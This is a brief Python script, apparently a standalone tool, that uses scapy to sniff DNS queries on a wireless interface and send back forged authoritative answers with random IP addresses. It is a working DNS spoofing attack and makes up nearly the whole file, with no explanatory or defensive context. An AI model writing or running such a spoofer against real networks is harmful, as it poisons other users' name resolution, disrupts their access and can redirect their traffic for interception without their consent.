from scapy.all import *

def dns_spoof(pkt):
    redirect_to = RandIP()
    if pkt.haslayer(DNSQR) and pkt.haslayer(IP): # DNS question record
        # print 'Recv from (',pkt[IP].src,'):', pkt.summary()
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        send(spoofed_pkt)
        # print 'Sent to (', spoofed_pkt[IP].dst, '):', spoofed_pkt.summary()


# Make it works for localhost:
conf.L3socket = L3RawSocket
sniff(filter='udp port 53', iface='wlan3', store=0, prn=dns_spoof)
